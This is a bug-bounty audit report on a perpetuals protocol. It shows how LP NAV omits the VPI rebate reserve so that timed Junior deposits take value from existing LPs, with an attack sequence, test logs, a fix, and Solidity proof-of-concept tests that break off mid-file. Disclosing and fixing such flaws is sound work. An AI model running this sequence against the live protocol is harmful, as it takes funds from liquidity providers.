# \#97682 [SC-Critical] LP NAV leaves out the VPI rebate that every skew-reducing position must return to the pool, so Junior deposits activated while such a position is open take value from existing Junior LPs

**Submitted on Nov 2nd 2026 at 16:38:59 UTC by @RUNSUN for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97682
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

The protocol states its LP pricing invariant in `SECURITY.md:859-860`: "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV". Four lines later, `SECURITY.md:863` adds that "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book". The code breaks the fairness the first sentence promises for one specific quantity that the second sentence was not written for: the VPI rebate `R` that the pool advances to a skew-reducing trader. The pool pays `R` out of its cash, the same amount is locked in the trader's non-withdrawable `vpiRebateReserve`, and every exit path is guaranteed to return at least `R` to the pool (`CloseAccountingLib.sol:112-118` clamp; liquidation consumes the reserve). The LP NAV that prices Junior deposits and redemptions counts the cash outflow but not the reserved return. A Junior deposit activated while such a position is open buys at a NAV that is short by `R`, and when `R` comes back part of it accrues to the new shares. Measured from the same snapshot with and without the skew-reducing position, existing Junior LPs end 3,395 USDG worse off (3,398.74 USDG through the production router path) for a 3M USDG deposit at deployed parameters. A one-for-one fix (count the aggregate reserve in the NAV input) silences the differential to 3.89 USDG.

## Vulnerability Details

**1. A skew-reducing open pays the rebate out of pool cash** (`CfdEnginePlanLib.sol:333`, `CfdEngineSettlementSidecar.sol:442-444`):

```solidity
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

The same amount is held in the trader's reserve. `SECURITY.md:866`: "gross negative lifetime VPI is backed by a dedicated nonwithdrawable reserve equal to `max(-vpiAccrued, 0)`".

**2. Every exit returns at least `R` to the pool.** Close (`CloseAccountingLib.sol:112-118`):

```solidity
// Clamp so lifetime VPI (accrued + delta) never goes negative. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

Liquidation takes the full clawback target (`CfdEnginePlanLib.sol:1559`, `vpiClawbackAssets = _negativeVpiReserveTarget(pos.vpiAccrued)`), and both paths move the reserve into the pool (`CfdEngineSettlementSidecar.sol:692` and `:803`, `clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), ...)`). Executed in the attached scenarios file: a full close returns `R` + 6.29 USDG carry (`test_P4`, `vm.expectCall(consumeVpiRebateReserve(T, pool, R))` passes); two half closes return more than `R` in total (`test_P5`); a solvent liquidation and a liquidation with about 85k USDG of bad debt both consume exactly `R` into the pool (`test_P6`, `test_P7`). No path gives `R` to anyone but the pool.

**3. The LP NAV ignores this receivable.** The canonical terminal-NAV snapshot "shared by LP entry and exit pricing" starts from physical assets and adds only the price-based terminal delta (`HousePoolAccountingLib.sol:60-78`); the engine's input snapshot has no reserve term (`CfdEngineProtocolLens.sol:70`):

```solidity
function buildReconcileSnapshot(HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot)
    internal pure returns (ReconcileSnapshot memory snapshot)
{
    uint256 terminalAssets = engineSnapshot.physicalAssets;            // cash, already reduced by R
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets; // price-only; the reserve is not included
    ...
}
```

Junior deposits are priced against that principal (`HousePool.sol:915`, `juniorDepositPhase.pricingAssets = juniorPrincipal;`). In the PoC the NAV used for LP pricing falls by exactly `R` when the skew-reducing position opens (9,008,804.04 -> 9,002,005.14 USDG); with the fix it does not move.

**Documented mechanism, undocumented consequence.** PR Plether-Fi/plether-core#62 (merged before the pinned commit), together with `SECURITY.md:871-872`, `ACCOUNTING_SPEC.md:1064-1066` and `WHITEPAPER.md` section 3.5, documents the mechanism (VPI and its reserve are kept out of terminal `K` and symmetric NAV), not the consequence (a value transfer between Junior LP cohorts whenever an epoch settles while a reserve is open).

**Anticipated versus certain.** The documents exclude anticipated action economics from NAV so that NAV never counts value that may not arrive; compare `ACCOUNTING_SPEC.md:1292`, "uncollected carry is not an LP receivable". The negative-VPI clawback is not anticipated in that sense. It is backed one-for-one by a non-withdrawable reserve "equal to `max(-vpiAccrued, 0)`" (`SECURITY.md:866`), and every exit path collects it (the close clamp and the liquidation reserve consumption above). Excluding it understates NAV by an amount that is certain to return.

**Attack sequence through the production path** (test `test_X1_routerPath`, deployed parameters, constant price; every trade through `router.commitOrder` + keeper `router.executeOrder` with Pyth data, every LP settlement through the permissionless `router.settleLpEpoch`):

1. Organic skew exists: account L holds a 3.5M USDG long. Pool depth is about 9.0M (Junior 3M, Senior 6M).
2. Before the request cutoff, attacker LP A requests a 3M USDG Junior deposit (cancellable until its epoch starts).
3. 120 seconds before the epoch boundary, after the cutoff, attacker trader T commits a 3.5M short; a keeper executes it. The pool pays out `R = 6,798.90` USDG, and T's reserve holds the same amount.
4. At the boundary anyone calls `router.settleLpEpoch`. A's deposit activates at the NAV that is short by `R`.
5. T closes in the next block (hold 121 s). The close returns `R` to the pool.
6. A redeems at the earliest point the one-hour activation cooldown allows.

## Impact Details

**Loss to existing LPs (the harm we claim), all relative to the same sequence without the skew-reducing position, from the same snapshot:**

| scenario | existing Junior LPs | with the fix |
|---|---|---|
| A = 3M, test helpers | -3,395.02 | +3.90 |
| A = 3M, router path | -3,398.74 | +0.12 |
| A = 9M | -5,096.85 | +1.88 |
| no attacker: D = 500k, third-party T 1M vs L 2M | -237.47 | +0.40 |

(USDG.) The loss is about `R x A / (J + A)` per settlement (predicted 3,398.91 for configuration 1). It also runs the other way: an existing Junior LP redeeming 1M in an epoch funded while a reserve is open (`R = 6,120.03`) receives 1,529.65 USDG less than in the same sequence without it, and 0.00 less with the fix (`test_R1_redemptionSide`). The mispricing needs no attacker: any Junior deposit or redemption that settles while any skew-reducing position is open is priced against a NAV short by that position's reserve.

**Gain to the depositor (second; constant price; T's price exposure is not modelled):**
- third-party variant: when the skew-reducing position belongs to someone else, A trades nothing and realises +3,402.74 USDG more than the control (`test_P11`);
- attacker owns T: net +543.80 USDG through the router path after T's 2,800.43 USDG of fees and carry, and +540.23 USDG with the test helpers, both realised through an actual redemption; +2,214.70 USDG at A = 9M. The fees go to the treasury, not to LPs.

**Why "Theft of unclaimed yield".** `R` is an advance that existing LPs funded and will certainly recover; its recovery raises their NAV exactly like income booked on collection. A Junior deposit activated before collection captures part of it. The harm does not depend on the attacker's profit: it is the loss to existing LPs, measured directly above. Immunefi's own definition of this impact says so: "The impact is calculated to be the amount stolen. The amount stolen does not need to be profit to the attacker, the attacker's profit may only be a portion of the amount stolen." (https://immunefisupport.zendesk.com/hc/en-us/articles/18753869210641-Theft-of-Unclaimed-Yield) If the triager does not accept `R` as yield, we accept re-classification; the measured loss to existing LPs does not change.

**What we do not claim.** NAV can also overstate at high skew: it counts a skew-increasing trader's positive VPI charge as cash, and that charge can be refunded later. A mirror sequence with no reserve at all (A deposits while flat, L opens, A redeems, L closes) gives A +2,496.46 USDG, identically with and without the fix (`test_P13_mirrorNoReserve`). That is a separate, wider pricing property and is not part of this report; the fix below silences only the reserve exclusion we report.

## Known-issues check

- `SECURITY.md:871-872` ("neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV") and `ACCOUNTING_SPEC.md:1064-1066` sit under "Exact symmetric LP NAV" and the accounting specification. Neither is one of the SECURITY.md sections the programme lists as known issues ("Known Limitations", "Router and keeper limitations", "Known limitation: live basket component selection", "Arbitrum and Pyth clock alignment").
- The listed VPI limitations cover liquidation VPI, depth, the lifetime clamp and partial-close release, not LP pricing. `SECURITY.md:1443` ("the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips") is about the trader side. "A positive marked receivable is not cash" (LP accounting limitations) is about liquidity, the opposite direction.
- Cecuro MED-22 (carry rounding) and LOW-13/LOW-63 (rounding dust) are different mechanisms. The October 15 AI scan's VPI items concern manipulating the VPI charge through pool liquidity, not NAV. A query over the in-repo audit PDFs found no finding that links the VPI reserve to LP share pricing.


## Recommendation

Count the reserved clawback as a pool receivable in the LP NAV: keep an aggregate of all open `vpiRebateReserve` balances and add it to the NAV input that `HousePoolAccountingLib.buildReconcileSnapshot` uses for entry and exit pricing. The attached `fixarm.diff` does exactly this (about 10 lines in `MarginClearinghouse.sol` and `CfdEngineProtocolLens.sol`) and was compiled and run: it silences the differential above while leaving every other test in the two files passing. If the team prefers to keep the receivable out of NAV, defer Junior deposit activation and redemption funding while the aggregate reserve is above a small threshold.



## Proof of Concept

## Proof of Concept

Files (place under `packages/perps/test/perps/poc/lp_nav_vpi/`): `LpNavVpiReserveMispricing.t.sol` (contract `LpNavVpiReserveMispricingTest`) and `LpNavVpiReserveScenarios.t.sol` (contracts `ReserveScenarioTest`, `ReserveRedeemTest`, `ReserveRouterTest`). Fix arm: `fixarm.diff`. Risk parameters are those of `script/DeployPerpsArbitrumSepolia.s.sol:436-445` (vpiFactor 0.01e18, maxSkewRatio 0.4e18, maint 10, init 20, fad 300, carry 500), and the tests assert `executionFeeBps == 4`.

```
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveMispricing.t.sol -vv
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveScenarios.t.sol -vv
```

Build lane: via-IR is disabled only because building `src` plus every test under via-IR ran out of memory on our machine; the contracts are not modified for the vulnerable arm, and each command compiles only one test file's dependency graph.

`test_differential_cfg1` runs the vulnerable arm (T's skew-reducing short is open while A's deposit settles), reverts to a snapshot, and runs the control arm (no T) from the same state. Its harm assertions are: A's gain exceeds the control by more than `R/4`, and existing Junior LPs lose more than `R/4` compared with the control. Both fire on the unmodified source. With `fixarm.diff` applied, the same test fails because the harm no longer fires (A's excess gain is 3.89 USDG against the `R/4` threshold of 1,699.73 USDG). The first file settles epochs with the suite's settlement helper and values A's shares at NAV; the scenarios file realises A's gain through an actual redemption and repeats the sequence through the router (`test_X1_routerPath`), with the same result.

**Fix arm** (`fixarm.diff`): add `totalVpiRebateReserveAssets` to `MarginClearinghouse`, maintain it at the four reserve mutation sites (lock, reclassify, release, consume), and add it to `terminalLpPriceDeltaAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot`, which feeds `buildReconcileSnapshot`. Built and run:

| scenario | vulnerable | fixed |
|---|---|---|
| A excess realised gain vs control (P1) | +3,402.74 | +3.89 |
| router path, attacker net (X1) | +543.80 | -2,855.05 |
| no attacker, depositor gain vs control (P10) | +237.94 | +0.07 |
| A = 9M, attacker net (P12) | +2,214.70 | -2,884.03 |
| redeeming LP vs control (R1) | -1,529.65 | 0.00 |
| mirror with no reserve, not claimed (P13) | +2,496.46 | +2,496.46 |

The residual 3.89 USDG is carry and coupon rounding, against `R` = 6,798.90.

## Executed output (fresh run of the attached files, local, no network)

```
run_utc=2026-11-02T15:21:01Z forge Version: 1.7.1  unmodified source  LpNavVpiReserveMispricing.t.sol
[PASS] test_ctrl_cfg1() (gas: 2434537)
[PASS] test_differential_cfg1() (gas: 5451914)
  A gain VULN: 3398238575
  A gain CTRL: -4561122
  A gain delta (VULN - CTRL): 3402799697
  existing Junior loss attributable (VULN - CTRL): -3395016737
  R: 6798904683
  predicted R*A/(J+A) with J=principal before A: 3398914000
[PASS] test_differential_cfg2_bigA() (gas: 5494650)
[PASS] test_differential_cfg3_halfOffset() (gas: 5496484)
[PASS] test_vuln_cfg1() (gas: 3112943)
    pool before T open: 9008804043545
    pool after  T open: 9002005138862
    T vpiRebateReserve after open (R): 6798904683
Suite result: ok. 5 passed; 0 failed; 0 skipped

run_utc=2026-11-02T15:23:10Z forge Version: 1.7.1  unmodified source  LpNavVpiReserveScenarios.t.sol
[PASS] test_R1_redemptionSide() (gas: 4845887)
  X delta (VULN-CTRL): -1529645610
[PASS] test_X1_routerPath() (gas: 12581697)
  R (router path): 6798904683
  T hold seconds (open exec -> close exec): 121
  A realized VULN: 3344234289
  A realized CTRL: -54733464
  T change (fees, bounties, carry): -2800431564
  ATTACKER NET (A + T): 543802725
  existing Junior delta (VULN-CTRL): -3398736189
[PASS] test_P1_realizedDifferential() (gas: 6545937)
  A realized gain delta (VULN-CTRL): 3402742853
  existing Junior delta at redeem (VULN-CTRL): -3394959893
  ATTACKER NET (A realized + T change): 540226429
[PASS] test_P10_noAttackerCohort() (gas: 6518148)
  D realized gain delta (VULN-CTRL): 237941343
  existing Junior delta at redeem (VULN-CTRL): -237470741
[PASS] test_P11_thirdPartyDeposit() (gas: 6512495)
  third-party: attacker net incremental (A only): 3402742853
[PASS] test_P12_bigA() (gas: 6501581)
[PASS] test_P13_mirrorNoReserve() (gas: 2604452)
  MIRROR A realized: 2496460636
[PASS] test_P4_closeConsumesReserveToPool() (gas: 1810915)
  pool delta on T close: 6805191809
[PASS] test_P6_liquidationSolvent() (gas: 1821692)
[PASS] test_P7_liquidationBadDebt() (gas: 1821709)
  ... (P2, P3, P5, P8, P9, P14 also PASS)
Suite results: 1 + 1 + 14 passed; 0 failed

run_utc=2026-11-02T15:21:23Z forge Version: 1.7.1  fixarm.diff applied  LpNavVpiReserveMispricing.t.sol
[FAIL: HARM fires: A gains > R/4 more than control: 3886460 <= 1699726170] test_differential_cfg1() (gas: 6618743)
  A gain delta (VULN - CTRL): 3886460
  existing Junior loss attributable (VULN - CTRL): 3896500
Suite result: FAILED. 4 passed; 1 failed; 0 skipped

run_utc=2026-11-02T15:23:25Z forge Version: 1.7.1  fixarm.diff applied  LpNavVpiReserveScenarios.t.sol
  X delta (VULN-CTRL): 0
  ATTACKER NET (A + T): -2855049395
  existing Junior delta (VULN-CTRL): 115931
  A realized gain delta (VULN-CTRL): 3886461
  D realized gain delta (VULN-CTRL): 67168
  A=9M ATTACKER NET (A + T): -2884030502
  MIRROR A realized: 2496460636
Suite results: 1 + 1 + 14 passed; 0 failed
```

(Values in micro-USDG. Log lines shortened; full logs on request.) Built and run with forge 1.7.1 (commit 4072e48) on the non-via-IR lane, one file at a time.


### Full test code and fix diff (inline, because attachments accept only images)

`packages/perps/test/perps/poc/lp_nav_vpi/LpNavVpiReserveMispricing.t.sol`:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice LP NAV omits the reserved negative-VPI clawback. A skew-reducing open pays R out of the
///         pool into the trader's vpiRebateReserve; the next close returns >= R. Junior deposits settled while the
///         position is open are priced on principal marked down by R.
///         Differential: VULN arm (skew-reducing open T present during the deposit epoch) vs CONTROL arm (no T).
contract LpNavVpiReserveMispricingTest is BasePerpTest {

    address internal constant L = address(0x10A6);   // organic skew (LONG)
    address internal constant T = address(0x5EA7);   // attacker trader (skew-reducing SHORT)
    address internal constant A = address(0xA77A);   // attacker LP (Junior deposit)

    uint256 internal constant J0 = 3_000_000e6;
    uint256 internal constant S0 = 6_000_000e6;

    /// Deploy params (script/DeployPerpsArbitrumSepolia.s.sol:436-441) + engine default executionFeeBps 4.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return J0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return S0;
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(L, 1_000_000e6);
        _fundTrader(T, 1_000_000e6);
        assertEq(engine.executionFeeBps(), 4, "deploy exec fee");
    }

    function _mark() internal {
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, SafeCast.toUint64(block.timestamp));
    }

    struct Result {
        uint256 poolBeforeT;
        uint256 poolAfterT;
        uint256 reserveT;
        uint256 sharesA;
        uint256 valueAAtMint;
        uint256 valueAEnd;
        uint256 existingSharesValueStart;
        uint256 existingSharesValueEnd;
        uint256 tBalStart;
        uint256 tBalEnd;
        uint256 poolBeforeClose;
        uint256 poolAfterClose;
        uint256 juniorPrincipalAtMint;
    }

    /// @param withT VULN arm when true, CONTROL arm when false.
    function _run(
        bool withT,
        uint256 sizeL,
        uint256 sizeT,
        uint256 depositA
    ) internal returns (Result memory r) {
        uint256 existingShares = juniorVault.balanceOf(address(this));
        _mark();
        _open(L, CfdTypes.Side.LONG, sizeL, 200_000e6, 1e8);
        r.existingSharesValueStart = juniorVault.convertToAssets(existingShares);
        r.tBalStart = clearinghouse.balanceAssets(T);

        if (withT) {
            r.poolBeforeT = pool.totalAssets();
            _open(T, CfdTypes.Side.SHORT, sizeT, 200_000e6, 1e8);
            r.poolAfterT = pool.totalAssets();
            r.reserveT = clearinghouse.vpiRebateReserveAssets(T);
        }

        // Attacker LP requests a Junior deposit before the cutoff of the imminent epoch.
        settlementToken.mint(A, depositA);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), depositA);
        uint256 requestId = juniorVault.requestDeposit(depositA, A, A);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        _mark();
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, A);
        assertEq(claimable, depositA, "deposit settled");
        vm.prank(A);
        r.sharesA = juniorVault.claimDeposit(requestId, claimable, A, A);
        r.valueAAtMint = juniorVault.convertToAssets(r.sharesA);
        (, r.juniorPrincipalAtMint,,) = pool.getPendingTrancheState();

        // 10 minutes later the attacker trader closes (same price).
        vm.warp(block.timestamp + 10 minutes);
        _mark();
        r.poolBeforeClose = pool.totalAssets();
        if (withT) {
            _close(T, CfdTypes.Side.SHORT, sizeT, 1e8);
        }
        r.poolAfterClose = pool.totalAssets();
        r.tBalEnd = clearinghouse.balanceAssets(T);
        r.valueAEnd = juniorVault.convertToAssets(r.sharesA);
        r.existingSharesValueEnd = juniorVault.convertToAssets(existingShares);
    }

    function _log(string memory tag, Result memory r, uint256 depositA) internal {
        emit log_string(tag);
        emit log_named_uint("  pool before T open", r.poolBeforeT);
        emit log_named_uint("  pool after  T open", r.poolAfterT);
        emit log_named_uint("  T vpiRebateReserve after open (R)", r.reserveT);
        emit log_named_uint("  juniorPrincipal right after A mint", r.juniorPrincipalAtMint);
        emit log_named_uint("  A deposit", depositA);
        emit log_named_uint("  A value at mint", r.valueAAtMint);
        emit log_named_uint("  pool before T close", r.poolBeforeClose);
        emit log_named_uint("  pool after  T close", r.poolAfterClose);
        emit log_named_uint("  A value end", r.valueAEnd);
        emit log_named_int("  A gain (end - deposit)", int256(r.valueAEnd) - int256(depositA));
        emit log_named_int(
            "  existing Junior value change (end - start)",
            int256(r.existingSharesValueEnd) - int256(r.existingSharesValueStart)
        );
        emit log_named_int("  T settlement change (end - start)", int256(r.tBalEnd) - int256(r.tBalStart));
        emit log_named_int(
            "  ATTACKER NET (A gain + T change)",
            int256(r.valueAEnd) - int256(depositA) + int256(r.tBalEnd) - int256(r.tBalStart)
        );
    }

    // -------- config 1: J=3M, S=6M (D~9M), skew 3.5M, A = 3M = J
    function test_vuln_cfg1() public {
        Result memory r = _run(true, 3_500_000e18, 3_500_000e18, 3_000_000e6);
        _log("VULN cfg1 (L 3.5M LONG, T 3.5M SHORT, A 3M)", r, 3_000_000e6);
        assertGt(r.reserveT, 0, "mechanism: reserve R > 0");
        assertLt(r.poolAfterT, r.poolBeforeT, "mechanism: pool falls on skew-reducing open");
        assertGe(r.poolAfterClose, r.poolBeforeClose + r.reserveT, "mechanism: close returns >= R to the pool");
    }

    function test_ctrl_cfg1() public {
        Result memory r = _run(false, 3_500_000e18, 3_500_000e18, 3_000_000e6);
        _log("CTRL cfg1 (no T)", r, 3_000_000e6);
    }

    /// Differential harm assertion in ONE test: fires with T, silent without.
    function test_differential_cfg1() public {
        uint256 snap = vm.snapshotState();
        Result memory v = _run(true, 3_500_000e18, 3_500_000e18, 3_000_000e6);
        vm.revertToState(snap);
        Result memory c = _run(false, 3_500_000e18, 3_500_000e18, 3_000_000e6);
        int256 gainV = int256(v.valueAEnd) - int256(3_000_000e6);
        int256 gainC = int256(c.valueAEnd) - int256(3_000_000e6);
        int256 exV = int256(v.existingSharesValueEnd) - int256(v.existingSharesValueStart);
        int256 exC = int256(c.existingSharesValueEnd) - int256(c.existingSharesValueStart);
        emit log_named_int("A gain VULN", gainV);
        emit log_named_int("A gain CTRL", gainC);
        emit log_named_int("A gain delta (VULN - CTRL)", gainV - gainC);
        emit log_named_int("existing Junior delta VULN", exV);
        emit log_named_int("existing Junior delta CTRL", exC);
        emit log_named_int("existing Junior loss attributable (VULN - CTRL)", exV - exC);
        emit log_named_uint("R", v.reserveT);
        emit log_named_uint("predicted R*A/(J+A) with J=principal before A", v.reserveT * 3_000_000e6 / (v.juniorPrincipalAtMint));
        // HARM (differential): A gains and existing Juniors lose materially more with the skew-reducing open present.
        assertGt(gainV - gainC, int256(v.reserveT / 4), "HARM fires: A gains > R/4 more than control");
        assertLt(exV - exC, -int256(v.reserveT / 4), "HARM fires: existing Junior LPs lose > R/4 vs control");
    }

    // -------- config 2: A = 9M = 3J
    function test_differential_cfg2_bigA() public {
        uint256 snap = vm.snapshotState();
        Result memory v = _run(true, 3_500_000e18, 3_500_000e18, 9_000_000e6);
        _log("VULN cfg2 (A 9M)", v, 9_000_000e6);
        vm.revertToState(snap);
        Result memory c = _run(false, 3_500_000e18, 3_500_000e18, 9_000_000e6);
        _log("CTRL cfg2 (A 9M)", c, 9_000_000e6);
        emit log_named_int("A gain delta (VULN - CTRL)", int256(v.valueAEnd) - int256(c.valueAEnd));
    }

    // -------- config 3: half-offset (T 1.75M), A = 3M
    function test_differential_cfg3_halfOffset() public {
        uint256 snap = vm.snapshotState();
        Result memory v = _run(true, 3_500_000e18, 1_750_000e18, 3_000_000e6);
        _log("VULN cfg3 (T 1.75M)", v, 3_000_000e6);
        vm.revertToState(snap);
        Result memory c = _run(false, 3_500_000e18, 1_750_000e18, 3_000_000e6);
        _log("CTRL cfg3", c, 3_000_000e6);
        emit log_named_int("A gain delta (VULN - CTRL)", int256(v.valueAEnd) - int256(c.valueAEnd));
    }
}
```

`packages/perps/test/perps/poc/lp_nav_vpi/LpNavVpiReserveScenarios.t.sol`:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Additional scenarios for the VPI-reserve NAV exclusion: realised differential, NAV path, reserve consumption
///         on every exit path, price exposure, cohort transfer without an attacker, redemption side and the router path.
///         Every scenario runs unchanged on the unmodified tree and on the tree with fixarm.diff applied.
abstract contract ReserveScenarioBase is BasePerpTest {

    address internal constant L = address(0x10A6); // skew-increasing LONG
    address internal constant T = address(0x5EA7); // skew-reducing SHORT
    address internal constant A = address(0xA77A); // Junior depositor
    address internal constant X = address(0xB0B0); // existing Junior LP who redeems (redemption side)
    address internal constant K = address(0x4EE9); // keeper

    uint256 internal constant J0 = 3_000_000e6;
    uint256 internal constant S0 = 6_000_000e6;

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return J0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return S0;
    }

    function setUp() public virtual override {
        super.setUp();
        _fundTrader(L, 1_000_000e6);
        _fundTrader(T, 1_000_000e6);
        assertEq(engine.executionFeeBps(), 4, "deploy exec fee");
    }

    function _mark(
        uint256 price
    ) internal {
        vm.prank(address(router));
        engine.updateMarkPrice(price, SafeCast.toUint64(block.timestamp));
    }

    function _vpiAccrued(
        address a
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _juniorPending() internal view returns (uint256 jp) {
        (, jp,,) = pool.getPendingTrancheState();
    }

    function _seniorPending() internal view returns (uint256 sp) {
        (sp,,,) = pool.getPendingTrancheState();
    }

    function _nav(
        string memory tag
    ) internal returns (int256 navCash) {
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory s = pool.ENGINE_PROTOCOL_LENS().getHousePoolInputSnapshot(0);
        navCash = int256(s.physicalAssets) - int256(s.traderClaimBalanceAssets) + s.terminalLpPriceDeltaAssets;
        emit log_string(tag);
        emit log_named_uint("    pool.totalAssets", pool.totalAssets());
        emit log_named_int("    lens terminalLpPriceDeltaAssets", s.terminalLpPriceDeltaAssets);
        emit log_named_int("    engine terminal price delta", engine.terminalNavSnapshot().terminalLpPriceDeltaAssets);
        emit log_named_uint("    trader claims", s.traderClaimBalanceAssets);
        emit log_named_int("    NAV used for LP pricing (phys - claims + lensDelta)", navCash);
        emit log_named_uint("    pending junior principal", _juniorPending());
        emit log_named_uint("    pending senior principal", _seniorPending());
        emit log_named_uint("    reserve(T)", clearinghouse.vpiRebateReserveAssets(T));
        emit log_named_uint("    reserve(L)", clearinghouse.vpiRebateReserveAssets(L));
        emit log_named_int("    vpiAccrued(L)", _vpiAccrued(L));
        emit log_named_int("    vpiAccrued(T)", _vpiAccrued(T));
        emit log_named_uint("    treasury balance", clearinghouse.balanceAssets(engine.protocolTreasury()));
    }

    struct Cfg {
        bool withT;
        uint256 sizeL;
        uint256 sizeT;
        uint256 depositA;
        int256 moveBps; // price move applied at T's close and held through A's redemption
        bool closeLAfter; // L closes after A redeems
        uint256 holdAfterSettle; // seconds between settlement and T's close
    }

    struct Out {
        uint256 R;
        uint256 sharesA;
        int256 aMarkGainAfterTClose; // convertToAssets(sharesA) - deposit, right after T close
        int256 aCashGain; // redeemed cash - deposit
        int256 tChange;
        int256 lChange;
        int256 existingChangeAtRedeem; // existing Junior (this) value change start -> after A redeem
        int256 existingChangeEnd; // ... -> end (after optional L close)
        uint256 poolAfterTClose;
    }

    function _cycle(
        Cfg memory c
    ) internal returns (Out memory o) {
        uint256 existingShares = juniorVault.balanceOf(address(this));
        int256 lStart = int256(clearinghouse.balanceAssets(L));
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, c.sizeL, 200_000e6, 1e8);
        uint256 exStart = juniorVault.convertToAssets(existingShares);
        int256 tStart = int256(clearinghouse.balanceAssets(T));
        if (c.withT) {
            _open(T, CfdTypes.Side.SHORT, c.sizeT, 200_000e6, 1e8);
            o.R = clearinghouse.vpiRebateReserveAssets(T);
        }
        settlementToken.mint(A, c.depositA);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), c.depositA);
        uint256 reqId = juniorVault.requestDeposit(c.depositA, A, A);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(reqId);
        vm.warp(activation);
        _mark(1e8);
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableDepositRequest(reqId, A);
        assertEq(claimable, c.depositA, "deposit settled");
        vm.prank(A);
        o.sharesA = juniorVault.claimDeposit(reqId, claimable, A, A);

        uint256 p1 = uint256(int256(1e8) + int256(1e8) * c.moveBps / 10_000);
        vm.warp(block.timestamp + c.holdAfterSettle);
        _mark(p1);
        if (c.withT) {
            _close(T, CfdTypes.Side.SHORT, c.sizeT, p1);
        }
        o.poolAfterTClose = pool.totalAssets();
        o.aMarkGainAfterTClose = int256(juniorVault.convertToAssets(o.sharesA)) - int256(c.depositA);
        o.tChange = int256(clearinghouse.balanceAssets(T)) - tStart;

        // A redeems at the earliest point the cooldown allows.
        vm.warp(activation + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _mark(p1);
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(o.sharesA, A, A);
        vm.warp(pool.lpEpochStart(rid));
        _mark(p1);
        _settleLpEpochForTest();
        uint256 cr = juniorVault.claimableRedeemRequest(rid, A);
        assertEq(cr, o.sharesA, "redeem funded in full");
        uint256 before = settlementToken.balanceOf(A);
        vm.prank(A);
        juniorVault.claimRedeem(rid, cr, A, A);
        o.aCashGain = int256(settlementToken.balanceOf(A) - before) - int256(c.depositA);
        o.existingChangeAtRedeem = int256(juniorVault.convertToAssets(existingShares)) - int256(exStart);

        if (c.closeLAfter) {
            vm.warp(block.timestamp + 60);
            _mark(p1);
            _close(L, CfdTypes.Side.LONG, c.sizeL, p1);
        }
        o.lChange = int256(clearinghouse.balanceAssets(L)) - lStart;
        o.existingChangeEnd = int256(juniorVault.convertToAssets(existingShares)) - int256(exStart);
    }

    function _logOut(
        string memory tag,
        Out memory o
    ) internal {
        emit log_string(tag);
